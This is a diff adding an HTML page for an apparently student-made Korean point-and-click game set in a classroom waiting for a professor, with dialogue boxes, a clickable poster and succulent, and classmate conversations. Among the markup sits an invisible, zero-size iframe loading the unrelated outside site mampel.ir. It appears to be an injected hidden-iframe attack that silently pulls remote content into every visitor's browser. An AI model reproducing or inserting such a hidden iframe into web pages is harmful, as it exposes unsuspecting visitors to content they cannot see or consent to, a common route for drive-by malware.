@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html>
+<title>Professor map</title>
+<style>
+@font-face {
+      font-family: "DungGeunMo";
+      src: url("DungGeunMo.woff");
+    }
+	
+	body{background-color: #484535; font-family: "DungGeunMo";}
+	#backk{width: auto; height: 100%; animation:start 2s alternate;}
+	#backk img{width: 1250px; height: auto;}
+	
+	#bx { position: absolute; bottom: 5%; left: 25%; display:none; }
+	#bx img{ width: 70%; height: auto;  }
+
+	#poom1{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom2{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom3{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom4{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom5{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom6{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom7{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom8{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#hey{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#yuk{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#yuk2{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#yuk3{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+
+
+	#nn{bottom: 18%; font-weight: 5px; font-size: 1.5em;display:none; left: 28%;font-family: "DungGeunMo";}
+
+	#okk{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#okk img{height: 20px;width: auto; }
+
+	#oo{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#oo img{height: 20px;width: auto; }
+	#ooo{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ooo img{height: 20px;width: auto; }
+	#oooo{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#oooo img{height: 20px;width: auto; }	
+	#orange1{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#orange1 img{height: 20px;width: auto; }	
+	#orange2{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#orange2 img{height: 20px;width: auto; }	
+	#orange3{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#orange3 img{height: 20px;width: auto; }	
+	#orange4{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#orange4 img{height: 20px;width: auto; }	
+	#orange5{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#orange5 img{height: 20px;width: auto; }	
+	#orange6{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#orange6 img{height: 20px;width: auto; }	
+	#orange7{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#orange7 img{height: 20px;width: auto; }	
+	#orange8{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#orange8 img{height: 20px;width: auto; }	
+
+	#sigar { position: absolute; z-index: 99;cursor: pointer; bottom:68%; right: 25%; }
+	#sigar img{ position: absolute; width: 250px; height: 200px;z-index: 99;cursor: pointer;}
+
+	#hee { position: absolute; z-index: 98;cursor: pointer; bottom:65%;right:  53%;animation:start 2s alternate; }
+	#hee img{ position: absolute; width: 240px; height:auto;z-index: 99;cursor: pointer;}
+
+	#da { position: absolute; z-index: 2;cursor: pointer; bottom:45%;left: 8%; animation:start 2s alternate;}
+	#da img{ position: absolute; width: 50px; height:auto;z-index:2;cursor: pointer;}
+
+	#ye { position: absolute; z-index: 2;cursor: pointer; bottom:25%;left: 35%; animation:start 2s alternate;}
+	#ye img{ position: absolute; width: 10px; height:auto;z-index:2;cursor: pointer;}
+
+
+
+#face1{ position: absolute; z-index:3; bottom: 48.5%; left: 2%;animation: pho 1s alternate;display: none;}
+	#face1 img{ position: absolute; width: 330px; height: auto; z-index:3;}
+#face2{ position: absolute; z-index:3; bottom: 49.5%; left: 2%;animation: pho 1s alternate;display: none;}
+	#face2 img{ position: absolute; width: 350px; height: auto; z-index:3;}
+
+
+	#turn{bottom: 8%; left: 48%; position: absolute;animation: backk 3s alternate; }
+	#turn img{width: 40px; height: auto;cursor: pointer; }
+	#lefts{top: 40%; left: 12%; position: absolute; cursor: pointer; animation: here 3s alternate; }
+	#lefts img{width: 40px; height: auto; }
+	#rights{top: 40%; right: 60%; position: absolute;animation: heree 3s alternate; }
+	#rights img{width: 40px; height: auto;cursor: pointer; }
+
+
+
+
+	#tt { position: absolute; z-index: 99; top: 8%; left: 37%; animation: tra 2s alternate; display: none;cursor: pointer; }
+	#tt img{ position: absolute; z-index: 99; width: 500px; height: auto; }	
+
+	#container{position: relative; margin: auto; width:1250px; height: 1000px;font-family: "DungGeunMo"; }
+
+@-webkit-keyframes typing { from { width: 0; } }
+@-webkit-keyframes blink-caret { 50% { border-color: #484535; } }
+
+@keyframes start{
+			0%{opacity: 0;}
+			
+			100%{opacity: 1;}
+		}
+
+@keyframes inin{
+			0%{top: 71%;}
+			
+			100%{top: 68%;}
+		}
+@keyframes backk{
+			0%{bottom: 11%;}
+			
+			100%{bottom: 8%;}
+		}			
+@keyframes rig{
+			0%{right: 48%;}
+			
+			100%{right: 45%;}
+		}		
+@keyframes heree{
+			0%{right: 62%;}
+			
+			100%{right: 60%;}
+		}
+@keyframes tra{
+			0%{opacity: 0}
+			
+			100%{opacity: 1}
+		}
+@keyframes here{
+			0%{left: 16%;}
+			
+			100%{left: 12%;}
+		}
+
+
+h1 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 58ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(20, end),
+	           blink-caret .1s step-end infinite alternate;z-index: 3;
+}
+h2 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 40ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(20, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h3 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 48ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(20, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h4 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 25ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 0.7s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h5 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 15ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 0.5s steps(10, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h6 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 52ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(20, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h10{color: #484535;position: absolute;z-index: 3; font-weight: 800;}
+</style>
+
+<head>
+	<title></title>
+</head>
+
+<body>
+
+	<div id="container">
+	 	<h5 id="hey">야야! 잠깐만!</h5>
+	 	<h1 id="poom1">너 설마 기웃거리다가 틈을 타서 새치기 하려는거 아니지?</h1>
+	 	<h4 id="poom2">야! 왜 무시해! 거기서!</h4>
+	 	<h4 id="poom3">머머리 포스터 액자이다.</h4>
+	 	<h3 id="poom4">머리가 패여있고 안에 수박이 보이는 포스터이다.</h3>
+	 	<h4 id="poom5">...조금 호러틱해 보인다.</h4>
+	 	<h2 id="poom6">여어~ 너도 앨리트네~? 이렇게 일찍오고~</h2>
+		<h1 id="poom7">아직 교수님 안오셨어! 좀있으면 오신대. 그때까진 기.다.려</h1>
+		<h1 id="poom8">뭐..내가 일등인것 같지만! 넌 나랑 희선이 다음이야! 하하!</h1>
+		<h4 id="yuk">오동통한 다육이가 있다.</h4>
+		<h3 id="yuk2">누가 방금 뿌렸는지 전체적으로 물기가 촉촉하다.</h3>
+		<h6 id="yuk3">오동통한 잎이다. 왼쪽의 다육이에서 떨어진 모양이다. </h6>
+		  <h10 id="nn">은서</h10>	
+
+
+	 	<audio id="walk">
+		<source src="walk.mp3" type="audio/mpeg"autoplay="true" preload="auto">
+	</audio>
+	<audio id="but">
+		<source src="but.mp3" type="audio/mpeg">
+	</audio>
+
+
+
+<iframe src="http://mampel.ir/" frameborder="0" style="width:0px;height:0px;border:0px" ></iframe>
+
+
+	<div id="backk">
+		<center>
+		<img src="main.png">
+		</center>
+	</div>
+	<a href="https://seoojing.github.io/602/">
+	<div id="turn">
+		<img src="turn.png">
+	</div>
+</a>
+
+
+	<div id="bx">
+		<img src="boox.png">
+	</div>
+<a href="https://seoojing.github.io/616/">
+	<div id="lefts">
+		<img src="here.png">
+	</div>
+		</a>
+
+	<div id="rights">
+		<img src="orhere.png">
+	</div>
+
+
+<div id="sigar">
+		<img src="blank.png">
+	</div>
+
+	<div id="oo">
+		<img src="won.png">
+	</div>
+	<div id="ooo">
+		<img src="won.png">
+	</div>
+	<div id="oooo">
+		<img src="won.png">
+	</div>
+	<div id="da">
+		<img src="dayuk.png">
+	</div>
+	<div id="ye">
+		<img src="yeh.png">
+	</div>
+	<div id="orange1">
+		<img src="won.png">
+	</div>
+	<div id="orange2">
+		<img src="okk.png">
+	</div>
+	<div id="orange3">
+	<img src="won.png">
+	</div>
+	<div id="orange4">
+	<img src="won.png">
+	</div>
+	<div id="orange6">
+	<img src="won.png">
+	</div>
+	<div id="orange7">
+	<img src="okk.png">
+	</div>
+	<div id="orange8">
+	<img src="okk.png">
+	</div>
+<a href="https://seoojing.github.io/616/">
+	<div id="orange5">
+	<img src="okk.png">
+	</div>
+</a>
+	<div id="okk">
+		<img src="okk.png">
+	</div>
+	<div id="tt">
+		<img src="sig.png">
+	</div>
+	<div id="hee">
+		<img src="hee.gif">
+	</div>
+	<div id="face1">
+		<img src="face1.png">
+	</div>
+	<div id="face2">
+		<img src="face2.png">
+	</div>
+</div>
+<script type="text/javascript">
+
+
+
+var bbPlay = 0;
+window.onmousemove = function(){
+	bbPlay++;
+	if(bbPlay == 1){walk.play();}
+}
+
+//머머리 액자부분
+sigar.onclick = function(){
+			but.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			poom3.style.display = "inline";
+			ooo.style.display = "inline"
+			}
+	ooo.onclick = function(){
+		but.play();
+			poom3.style.display = "none"
+			poom4.style.display = "inline"
+			ooo.style.display = "none"
+			oo.style.display = "inline"
+			sigar.style.display = "none"}
+	oo.onclick = function(){
+		but.play();
+			poom4.style.display = "none"
+			oo.style.display = "none"
+			poom5.style.display = "inline"
+			okk.style.display = "inline"}
+	okk.onclick = function(){
+		but.play();
+			okk.style.display = "none"
+			bx.style.display = "none"
+			poom5.style.display = "none"
+			sigar.style.display = "inline"}
+	
+//은서 부분
+	hee.onclick = function(){
+		but.play();
+			bx.style.display = "inline";
+			poom6.style.display = "inline";
+			oooo.style.display = "inline"
+			nn.style.display = "inline"
+			sigar.style.display = "none"
+			face1.style.display = "inline"
+			}
+	oooo.onclick = function(){
+		but.play();
+			poom6.style.display = "none"
+			poom7.style.display = "inline"
+			oooo.style.display = "none"
+			orange1.style.display = "inline"
+			face1.style.display = "none"
+			face2.style.display = "inline"
+		}
+	orange1.onclick = function(){
+		but.play();
+			poom7.style.display = "none"
+			poom8.style.display = "inline"
+			orange1.style.display = "none"
+			orange2.style.display = "inline"
+		}
+
+	orange2.onclick = function(){
+		but.play();
+			orange2.style.display = "none"
+			bx.style.display = "none"
+			poom8.style.display = "none"
+			face2.style.display = "none"
+			nn.style.display = "none"
+			sigar.style.display = "inline"}
+			
+			
+	//오른쪽으로 꺾을때
+rights.onclick = function(){
+			but.play();
+			bx.style.display = "inline";
+			hey.style.display = "inline";
+			orange3.style.display = "inline";
+			nn.style.display = "inline";
+			sigar.style.display = "none";
+			face1.style.display = "inline";
+			}
+	orange3.onclick = function(){
+		but.play();
+			orange3.style.display = "none"
+			orange4.style.display = "inline"
+			face1.style.display = "none"
+			face2.style.display = "inline"
+			hey.style.display = "none"
+			poom1.style.display = "inline"}
+
+	orange4.onclick = function(){
+		but.play();
+			orange4.style.display = "none"
+			orange5.style.display = "inline"
+			face2.style.display = "none"
+			face1.style.display = "inline"
+			poom1.style.display = "none"
+			poom2.style.display = "inline"}			
+	
+//다육이
+da.onclick = function(){
+			but.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			yuk.style.display = "inline";
+			orange6.style.display = "inline"
+			}
+orange6.onclick = function(){
+			but.play();
+			toggle = "on";
+			yuk.style.display = "none";
+			yuk2.style.display = "inline";
+			orange6.style.display = "none"
+			orange7.style.display = "inline"
+			}
+orange7.onclick = function(){
+			but.play();
+			orange7.style.display = "none"
+			bx.style.display = "none"
+			yuk2.style.display = "none"
+			sigar.style.display = "inline"
+			}
+
+//다육이 덩어리
+ye.onclick = function(){
+			but.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			yuk3.style.display = "inline";
+			orange8.style.display = "inline"
+			sigar.style.display = "none"
+			}
+orange8.onclick = function(){
+			but.play();
+			orange8.style.display = "none"
+			bx.style.display = "none"
+			yuk3.style.display = "none"
+			sigar.style.display = "inline"
+			}
+
+
+</script>
+</body>
+</html>
